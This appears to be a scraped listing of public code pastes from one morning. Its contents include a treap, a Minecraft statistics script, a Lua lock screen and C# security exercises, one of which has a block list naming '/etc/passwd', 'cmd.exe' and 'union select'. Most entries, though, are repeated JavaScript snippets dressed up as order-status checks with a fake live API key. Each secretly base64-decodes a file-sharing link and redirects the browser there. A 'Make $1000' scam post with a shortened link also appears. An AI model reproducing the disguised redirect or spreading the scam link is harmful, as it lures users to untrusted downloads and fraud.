UMny6Ut4,⭐Make $1000 15-MINUTES (BEGINNER) UU,SzymonG110,JavaScript,Tuesday 8th of April 2025 06:20:39 AM CDT," 
Pdf https://surl.li/lgybtn


ZPyB3FY2q4
"
bwmQtwHw,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:12:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93639/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mQbSL5ah,dataNone,TestGuy1,JSON,Tuesday 8th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd89a73dfc72e1d93d5b06c050c8cf5be266b84e9a71766d95ce7b25d91879f3fcfd782e8d35b4367993060880752b726d7d8b0f93b59551622e0d186f76c13fc232e6ca25dc1357e84a52caf51dc93e4ccd8d57cbe9189217e325c7233df5274988bca5c814d2a2300047dbbeb984c5986dd1419fd440df701d6357b9d7b93d0',
  otherdata: [
    '8e2948c5c33455f83253ab14f4d41b7c',
    '38ced6a6cf8242a179aa6e428a3142e3',
    'ea16fd1d82af7920a95b9889b4eaa212',
    '6bac97d94ba7e3ee7efeb781493926b9',
    'fd1f1fe7502c86cb000426c7a512e50a',
    '04fcf27cfd27f859beb6d9e0111e1f9e',
    '4ea501fc21ea1cc740b6f9962582a9bd',
    'ca18635d673562df8dec3c9d7e096627'
  ]
}"
vpz3recg,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:57:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95593/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2YARGAHH,Password lockout Screen. init_code.lua,GhastlyDoMinic,Lua,Tuesday 8th of April 2025 05:47:49 AM CDT,"-- Required Imports
local libs = require(""libs"")
--

--verables
local password_true = ""God""
--
-- Define the ""main"" function
-- This is the function we want to ""protect""
local function main()
	local hash_ = ""7a0c0b6d""
	
	if checkFileHash(""disk/authenticate"", hash_) then
		--sleep(0.2)
	else
		term.clear() -- clears the terminal
		term.setCursorPos(1,1) -- sets cursor postion
		
		printError(""Security Check Failed! - Shutdown"") -- prints a error message
		pcall(sleep, 5) -- sleeps for 5 seconds
		os.shutdown() -- shutdown CraftOS
	end
	
  while true do
    term.clear()
    term.setCursorPos(1, 1)
    write(""Password:"")
    local password = read(""*"")

    if password == password_true then
      return
    else
      printError(""Incorrect password."")
      pcall(sleep, 5)
    end
  end
end

local leaveloop = true
while leaveloop do
  local ok, err = pcall(main) -- protectedly call main
  
  if ok then
    -- Correct password was entered!
    -- do whatever you want here
	--term.clear()
	--term.setCursorPos(1, 1)
	--shell.run(""src_main.lua"")
	leaveloop = false
  else
    -- There was an error! The contents of the error are stored in ""err""
    if err == ""Terminated"" then
      printError(""\nSorry, but we can't have you terminating this now can we?"")
	  leaveloop = true
      pcall(sleep, 2) -- pcall the sleep function since it is also terminateable.
    end
  end
end"
sPPWGBEw,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:41:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34538/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hnjEMk8j,pivo,slash0t,C++,Tuesday 8th of April 2025 05:29:49 AM CDT,"//mt19937_64 rnd = mt19937_64((chrono::high_resolution_clock::now().time_since_epoch().count()));
mt19937_64 rnd = mt19937_64(69);

struct bo4ka {
    struct pivo {
        pivo* left = nullptr, * right = nullptr;
        int size, key, priority;
        pivo(int key_, int priority_) : key(key_), priority(priority_), size(1ll) {}
    };

    pivo* root;
    bo4ka(pivo* root_) : root(root_) {}
    bo4ka(vector<int>& a) {
        int n = a.size();

        pivo* tree = nullptr;
        for (int i = 0; i < n; i++) {
            pivo* now = new pivo(a[i], rnd());
            tree = merge(tree, now);
        }

        root = tree;
    }

    void upd(pivo* tree) {
        tree->size = 1;
        if (tree->left) tree->size += tree->left->size;
        if (tree->right) tree->size += tree->right->size;
    }

    typedef pair<pivo*, pivo*> kega;

    // max a key less than min b key
    pivo* merge(pivo* a, pivo* b) {
        if (!a) return b;
        if (!b) return a;

        if (a->priority > b->priority) {
            auto right = merge(a->right, b);
            a->right = right;
            upd(a);
            return a;
        }
        else {
            auto left = merge(a, b->left);
            b->left = left;
            upd(b);
            return b;
        }
    }

    int sz(pivo* tree) {
        return tree ? tree->size : 0;
    }

    kega split(pivo* tree, int k) {
        if (!tree) return { nullptr, nullptr };

        if (sz(tree->left) + 1 <= k) {
            kega p = split(tree->right, k - 1 - sz(tree->left));

            tree->right = p.first;
            upd(tree);

            return { tree, p.second };
        }
        else {
            kega p = split(tree->left, k);

            tree->left = p.second;
            upd(tree);

            return { p.first, tree };
        }
    }

    auto apply(int l, int r, pivo* function(pivo*)) {
        kega q1 = split(root, r);
        kega q2 = split(q1.first, l);
        q2.second = function(q2.second);
        root = merge(q2.first, merge(q2.second, q1.second));
    }

    void order(pivo* tree, vector<int>& ord) {
        if (!tree) return;

        order(tree->left, ord);
        ord.pb(tree->key);
        order(tree->right, ord);
    }

    vector<int> order() {
        vector<int> ord;
        order(root, ord);
        return ord;
    }

    // 1 indexed
    pivo* ctrlx(int l, int r) {
        kega q1 = split(root, r);
        kega q2 = split(q1.first, l - 1);
        root = merge(q2.first, q1.second);
        return q2.second;
    }

    void ctrlv(pivo* v, int k) {
        kega q = split(root, k);
        root = merge(q.first, merge(v, q.second));
    }
};"
gBQWivDE,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:26:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09692/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8xRPsRfX,AdvancementsCounter,Himeji,Python,Tuesday 8th of April 2025 05:23:47 AM CDT,"import os
import json
import requests
from collections import defaultdict
from typing import Dict, Optional, List, Tuple

MOJANG_API = ""https://api.mojang.com/user/profile/""

def get_username(uuid: str) -> Optional[str]:
    """"""Get the username from a UUID using the Mojang API.""""""
    response = requests.get(f""{MOJANG_API}{uuid}"")
    
    if response.status_code == 200:
        data = response.json()
        return data.get('name')
    return None

def validate_path(path: str) -> bool:
    """"""Validate the provided path.""""""
    if not os.path.exists(path):
        print(""Invalid path. Please try again."")
        return False
    
    if not os.path.isdir(path):
        print(""The path is not a directory. Please try again."")
        return False
    
    if not os.listdir(path):
        print(""The directory is empty. Please try again."")
        return False
    
    if not any(os.path.isfile(os.path.join(path, f)) for f in os.listdir(path)):
        print(""The directory does not contain any files. Please try again."")
        return False
    
    return True

def process_advancements(path: str, whitelist: List[str]) -> Tuple[Dict[str, int], Dict[str, int]]:
    """"""Process advancement files and return advancements and user counts.""""""
    advancements = defaultdict(int)
    users = {}
    
    for userfile in os.listdir(path):
        if not userfile.endswith("".json""):
            print(f""{userfile} is not a valid JSON file"")
            continue
            
        uuid = userfile.split(""."")[0]
        user_count = 0
        
        try:
            with open(os.path.join(path, userfile), 'r') as f:
                data = json.load(f)
                
                for key, value in data.items():
                    if not isinstance(value, dict) or not value.get(""done"", False):
                        continue
                        
                    # Check if advancement matches whitelist criteria
                    matches_whitelist = not whitelist or any(key.startswith(item) for item in whitelist)
                    
                    if matches_whitelist:
                        advancements[key] += 1
                        user_count += 1
        except json.JSONDecodeError:
            print(f""Error decoding JSON in file {userfile}"")
            continue
        except Exception as e:
            print(f""Error processing file {userfile}: {e}"")
            continue
            
        users[uuid] = user_count
        
    return dict(advancements), users

def display_results(advancements: Dict[str, int], users: Dict[str, int]) -> None:
    """"""Display the results in a readable format.""""""
    # Sort users by advancement count
    sorted_users = sorted(users.items(), key=lambda item: item[1], reverse=True)
    
    # Print top 10 users
    print(""\nTop 10 users:"")
    for i, (uuid, count) in enumerate(sorted_users[:10]):
        username = get_username(uuid)
        print(f""{username or 'Unknown'} ({uuid}): {count}"")
    
    # Print statistics
    print(f""\nTotal number of users: {len(users)}"")
    print(f""Total number of advancements found: {len(advancements)}"")
    
    # Sort advancements by count
    sorted_advancements = sorted(advancements.items(), key=lambda item: item[1], reverse=True)

    # Print advancements
    print(""\nAdvancements:"")
    for advancement, count in sorted_advancements:
        print(f""{advancement}: {count}"")

def main():
    path = input(""Enter the path to the Advancements folder: "")
    whitelist_input = input(""Enter advancements whitelist (ex. minecraft:mines,minecraft:unlocks): "")
    whitelist = [item.strip() for item in whitelist_input.split("","")] if whitelist_input else []
    
    if not validate_path(path):
        return
    
    advancements, users = process_advancements(path, whitelist)
    display_results(advancements, users)

if __name__ == ""__main__"":
    main()"
atQtMNqB,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:11:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98118/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
brVfahNX,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:55:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57946/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ERaP8u3n,Task 2.3,vovanhik_24,C#,Tuesday 8th of April 2025 04:54:20 AM CDT,"using System;
using Microsoft.ML;
using Microsoft.ML.Data;
using System.Collections.Generic;
using System.Linq;

namespace DDoSDetection
{
    class Program
    {
        static void Main(string[] args)
        {
            var mlContext = new MLContext();

            var trainingData = new List<TrafficData>
            {
                new TrafficData { PacketCount = 50, DataRate = 10, UniquePorts = 2 },
                new TrafficData { PacketCount = 55, DataRate = 12, UniquePorts = 2 },
                new TrafficData { PacketCount = 5000, DataRate = 900, UniquePorts = 50 },
                new TrafficData { PacketCount = 48, DataRate = 9, UniquePorts = 1 },
                new TrafficData { PacketCount = 6000, DataRate = 1100, UniquePorts = 80 }, 
            };

            var data = mlContext.Data.LoadFromEnumerable(trainingData);

            var pipeline = mlContext.Transforms
                .Concatenate(""Features"", nameof(TrafficData.PacketCount), nameof(TrafficData.DataRate), nameof(TrafficData.UniquePorts))
                .Append(mlContext.Clustering.Trainers.KMeans(featureColumnName: ""Features"", numberOfClusters: 2));

            var model = pipeline.Fit(data);

            var predictor = mlContext.Model.CreatePredictionEngine<TrafficData, TrafficPrediction>(model);

            var incomingTraffic = new List<TrafficData>
            {
                new TrafficData { PacketCount = 60, DataRate = 11, UniquePorts = 2 },
                new TrafficData { PacketCount = 7000, DataRate = 1200, UniquePorts = 100 },
                new TrafficData { PacketCount = 45, DataRate = 8, UniquePorts = 1 },
            };

            Console.WriteLine(""Анализ входящего трафика:"");
            foreach (var packet in incomingTraffic)
            {
                var prediction = predictor.Predict(packet);

                if (prediction.ClusterId == 2)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($""[!] Подозрительный трафик обнаружен! Пакеты: {packet.PacketCount}, Скорость: {packet.DataRate}, Порты: {packet.UniquePorts}"");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($""[OK] Нормальный трафик. Пакеты: {packet.PacketCount}, Скорость: {packet.DataRate}, Порты: {packet.UniquePorts}"");
                }
            }

            Console.ResetColor();
        }

        public class TrafficData
        {
            public float PacketCount { get; set; }
            public float DataRate { get; set; }
            public float UniquePorts { get; set; }
        }

        public class TrafficPrediction
        {
            [ColumnName(""PredictedLabel"")]
            public uint ClusterId { get; set; }
            public float[] Distance { get; set; }
        }
    }
}"
nRQHJUR1,Task1.5,vovanhik_24,C#,Tuesday 8th of April 2025 04:50:02 AM CDT,"using System;
using System.Collections.Generic;
using System.Numerics;

namespace RSA
{
    class Program
    {
        private static readonly int p = 61;
        private static readonly int q = 53;
        private static readonly int n = p * q;
        private static readonly int e = 17;
        private static readonly int d = 2753;

        static void Main(string[] args)
        {
            string message = ""Привет"";
            Console.WriteLine($""Оригинальное сообщение: {message}"");

            List<BigInteger> encrypted = EncryptMessage(message);

            Console.Write(""\nЗашифрованное сообщение: "");
            foreach (var val in encrypted)
            {
                Console.Write(val + "" "");
            }

            string decrypted = DecryptMessage(encrypted);
            Console.WriteLine($""\n\nРасшифрованное сообщение: {decrypted}\n\n"");
        }

        static BigInteger EncryptChar(char ch)
        {
            BigInteger m = ch;
            return BigInteger.ModPow(m, e, n);
        }

        static char DecryptChar(BigInteger cipher)
        {
            BigInteger m = BigInteger.ModPow(cipher, d, n);
            return (char)(int)m;
        }

        static List<BigInteger> EncryptMessage(string message)
        {
            List<BigInteger> result = new List<BigInteger>();

            foreach (char ch in message)
            {
                result.Add(EncryptChar(ch));
            }

            return result;
        }

        static string DecryptMessage(List<BigInteger> encrypted)
        {
            string result = """";

            foreach (BigInteger cipher in encrypted)
            {
                result += DecryptChar(cipher);
            }

            return result;
        }
    }
}"
EbRGmtuh,Task1.4,vovanhik_24,C#,Tuesday 8th of April 2025 04:43:38 AM CDT,"using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace PasswordHashing
{
    class Program
    {
        static readonly List<string> storedHashes = new List<string>();

        static void Main(string[] args)
        {
            Console.Write(""Введите пароль: "");
            string password = Console.ReadLine();

            string hash = HashPassword(password);
            storedHashes.Add(hash);

            Console.WriteLine($""Пароль: {password}"");
            Console.WriteLine($""Хэш: {hash}"");

            Console.Write(""\nВведите пароль для проверки:"");
            string input = Console.ReadLine();

            if (VerifyPassword(input))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(""Пароль верный!"");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(""Неверный пароль!"");
            }

            Console.ResetColor();
        }

        static string HashPassword(string password)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] bytes = Encoding.UTF8.GetBytes(password);
                byte[] hashBytes = sha256.ComputeHash(bytes);

                StringBuilder builder = new StringBuilder();

                foreach (byte b in hashBytes)
                {
                    builder.Append(b.ToString(""x2""));
                }
                
                return builder.ToString();
            }
        }

        static bool VerifyPassword(string inputPassword)
        {
            string inputHash = HashPassword(inputPassword);
            return storedHashes.Contains(inputHash);
        }
    }
}"
WTzB8tW6,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:39:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20417/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vUs1k5QW,Task1.3,vovanhik_24,C#,Tuesday 8th of April 2025 04:31:26 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace LoginAnalyzer
{
    struct LoginAttempt
    {
        public string IP;
        public DateTime Timestamp;

        public LoginAttempt(string ip, DateTime timestamp)
        {
            IP = ip;
            Timestamp = timestamp;
        }
    }

    class Program
    {
        const int Threshold = 5;

        static readonly TimeSpan TimeWindow = TimeSpan.FromMinutes(10);

        static void Main(string[] args)
        {
            List<LoginAttempt> loginAttempts = new List<LoginAttempt>
            {
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-9)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-8)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-7)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-6)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-5)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-4)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
            };

            DetectSuspiciousActivity(loginAttempts);
        }

        static void DetectSuspiciousActivity(List<LoginAttempt> attempts)
        {
            var groupedByIP = attempts.GroupBy(a => a.IP);

            foreach (var group in groupedByIP)
            {
                string ip = group.Key;

                DateTime now = DateTime.Now;
                var recentAttempts = group
                    .Where(a => now - a.Timestamp <= TimeWindow)
                    .ToList();

                if (recentAttempts.Count >= Threshold)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($""Обнаружено {recentAttempts.Count} попыток входа с IP {ip} за последние 10 минут!"");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine($""IP {ip}: {recentAttempts.Count} попыток входа за последние 10 минут."");
                }
            }
        }
    }
}"
SB6eKmpL,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:24:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65356/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gMj1JD4T,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:08:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49811/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xYxrNsn6,Task1.2,vovanhik_24,C#,Tuesday 8th of April 2025 03:58:32 AM CDT,"using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections.Generic;

namespace Task1_2
{
    public class Program
    {
        static void Main(string[] args)
        {
            int port = 8080;
            TcpListener listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($""[+] Прокси-сервер запущен на порту {port}..."");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Thread thread = new Thread(() => HandleClient(client));
                thread.Start();
            }
        }

        private static readonly List<string> MaliciousPatterns = new List<string>
        {
            ""SQLmap"",
            ""MaliciousHeader"",
            ""/etc/passwd"",
            ""cmd.exe"",
            ""union select""
        };

        private static void HandleClient(TcpClient client)
        {
            using (client)
            {
                try
                {
                    NetworkStream clientStream = client.GetStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead = clientStream.Read(buffer, 0, buffer.Length);

                    if (bytesRead == 0) 
                    {
                        return;
                    }

                    string requestText = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($""[>] Запрос от клиента:\n{requestText.Split('\n')[0]}"");

                    if (IsMalicious(requestText))
                    {
                        Console.WriteLine(""[!] Подозрительный запрос заблокирован!"");
                        string forbiddenResponse = ""HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n"";
                        byte[] responseBytes = Encoding.UTF8.GetBytes(forbiddenResponse);
                        clientStream.Write(responseBytes, 0, responseBytes.Length);
                        return;
                    }

                    ForwardRequest(requestText, clientStream);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($""[x] Ошибка: {ex.Message}"");
                }
            }
        }

        private static bool IsMalicious(string request)
        {
            request = request.ToLower();

            foreach (var pattern in MaliciousPatterns)
            {
                if (request.Contains(pattern.ToLower()))
                {
                    return true;
                }
            }

            return false;
        }

        private static void ForwardRequest(string requestText, NetworkStream clientStream)
        {
            try
            {
                string[] lines = requestText.Split(new[] { ""\r\n"", ""\n"" }, StringSplitOptions.None);
                string hostLine = Array.Find(lines, line => line.StartsWith(""Host:"", StringComparison.OrdinalIgnoreCase));

                if (hostLine == null)
                {
                    Console.WriteLine(""[!] Не удалось определить хост."");
                    return;
                }

                string host = hostLine.Substring(6).Trim();
                int port = 80;

                using (TcpClient server = new TcpClient(host, port))
                using (NetworkStream serverStream = server.GetStream())
                {
                    byte[] requestBytes = Encoding.UTF8.GetBytes(requestText);
                    serverStream.Write(requestBytes, 0, requestBytes.Length);

                    byte[] buffer = new byte[8192];
                    int bytesRead;

                    while ((bytesRead = serverStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        clientStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($""[x] Ошибка при пересылке запроса: {ex.Message}"");
            }
        }
    }
}"
ZF3WNiJd,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:53:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32631/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UzWyWAER,Task1.1,vovanhik_24,C#,Tuesday 8th of April 2025 03:47:02 AM CDT,"using System;
using System.Collections.Generic;
using System.Text;

namespace Task1_1
{
